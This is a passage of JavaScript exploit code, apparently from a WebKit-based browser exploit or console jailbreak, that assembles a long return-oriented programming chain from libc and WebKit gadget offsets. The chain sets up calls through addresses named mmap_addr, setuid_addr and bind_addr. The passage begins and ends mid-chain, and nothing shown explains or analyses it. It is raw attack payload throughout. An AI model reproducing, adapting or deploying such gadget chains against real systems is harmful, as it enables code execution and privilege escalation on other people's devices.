libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1195432, //L3447
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3446:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L3447:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1195520, //L3449
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1195536, //L3450
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3449:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3450:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1195680, //L3454
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1195648, //L3452
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1195664, //L3453
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3452:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3453:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3454:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L3456:
ropchain+1195784, //L3455
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1204576, //L3457
//L3455:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1195856, //L3458
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3458:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3459:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3460:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1196016, //L3462
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1196032, //L3463
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1196000, //L3461
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3461:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3462:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3463:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1196136, //L3464
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1196152, //L3465
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L3464:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3465:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1196272, //L3466
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1196256, //L3467
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L3467:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L3466:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1196360, //L3469
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1196344, //L3468
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3468:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3469:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1196464, //L3470
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1196480, //L3471
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L3470:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3471:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1196600, //L3472
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1196584, //L3473
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L3473:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L3472:
db([0, 0]); // 0x0
//L2975:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
mmap_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1197928, //L3474
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L3474:
db([0, 0]); // 0x0
//L2924:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
setuid_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1199256, //L3475
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L3475:
db([0, 0]); // 0x0
//L3225:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
bind_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1200584, //L3476
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L3476:
db([0, 0]); // 0x0
//L3258:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
